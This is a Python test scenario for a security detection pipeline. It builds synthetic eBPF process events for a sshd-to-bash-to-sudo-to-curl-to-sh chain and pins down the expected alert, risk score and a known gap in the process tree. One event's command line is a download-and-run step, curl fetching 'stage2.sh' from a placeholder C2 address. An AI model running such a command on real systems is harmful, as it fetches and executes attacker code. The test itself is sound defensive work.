"""Scenario 4: a suspicious process chain (Phase 8).

Process lineage as the eBPF process sensor would report it::

    sshd(1200) -> bash(4100) -> sudo(4150) -> curl(4200) -> sh(4300)

Only the last link is a detection: ``curl`` spawning a shell is the shape of a
download-and-run payload, and it is the parent/child *relationship* that the
rule keys on, not the name of the binary.  The earlier links are not
suspicious, and they are in the scenario because the thing being validated is
the reconstructed lineage -- a process tree that can only show its one alerting
node is not a process tree.

No process is started.  Every event is a synthetic record with the fields the
kernel probe fills in.
"""

from __future__ import annotations

from datetime import datetime

from ..scenario import C2_IP, Expectation, Scenario, ScenarioKind, process_start

OPERATOR = "deploy"
SSHD_PID = 1200
SHELL_PID = 4100
SUDO_PID = 4150
CURL_PID = 4200
PAYLOAD_PID = 4300


def build(base: datetime) -> list:
    return [
        process_start(
            0, base, process="bash", pid=SHELL_PID, ppid=SSHD_PID, parent="sshd",
            command_line="-bash", user=OPERATOR, executable="/usr/bin/bash",
        ),
        process_start(
            5, base, process="sudo", pid=SUDO_PID, ppid=SHELL_PID, parent="bash",
            command_line="sudo -i", user=OPERATOR, executable="/usr/bin/sudo",
        ),
        process_start(
            8, base, process="curl", pid=CURL_PID, ppid=SUDO_PID, parent="sudo",
            command_line=f"curl -s http://{C2_IP}/stage2.sh", user="root",
            executable="/usr/bin/curl", uid=0,
        ),
        process_start(
            12, base, process="sh", pid=PAYLOAD_PID, ppid=CURL_PID, parent="curl",
            command_line="sh", user="root", executable="/usr/bin/sh", uid=0,
        ),
    ]


SCENARIO = Scenario(
    scenario_id="process-chain",
    name="Suspicious Process Chain",
    description=(
        "sshd -> bash -> sudo -> curl -> sh: a shell spawned by a download tool "
        "at the end of an otherwise ordinary login lineage."
    ),
    kind=ScenarioKind.ATTACK,
    mitre_techniques=("T1059", "T1059.004"),
    build=build,
    tags=("execution", "ebpf", "process-tree"),
    containment_target=("kill_process", str(PAYLOAD_PID)),
    expected=Expectation(
        events=4,
        alerts=1,
        incidents=1,
        rule_ids=frozenset({"SUSPICIOUS_PROCESS_EXECUTION"}),
        # sshd -> bash and bash -> sudo are a normal login.  If either of them
        # alerted, every SSH session on the host would raise an incident.
        forbidden_rule_ids=frozenset(
            {"SUSPICIOUS_NETWORK_CONNECTION", "SUSPICIOUS_SUDO", "PORT_SCAN"}
        ),
        severity="high",
        risk_range=(80, 90),
        techniques=frozenset({"T1059", "T1059.004"}),
        users=frozenset({"root"}),
        response_options=frozenset({"kill_process"}),
        # What the incident-scoped process tree can actually show: the
        # alerting process and the parent its own telemetry names.
        process_tree_pids=frozenset({CURL_PID, PAYLOAD_PID}),
        # What it cannot: the earlier, non-alerting links.  See the note.
        process_tree_missing_pids=frozenset({SSHD_PID, SHELL_PID, SUDO_PID}),
        notes=(
            "The sensors observed five processes; the incident's evidence is the "
            "one alerting execve, so the tree shows sh and the curl its telemetry "
            "names, and the bash/sudo/sshd ancestry is not rendered. That gap is "
            "a documented limitation, pinned by dashboard.process_tree_gap."
        ),
    ),
)
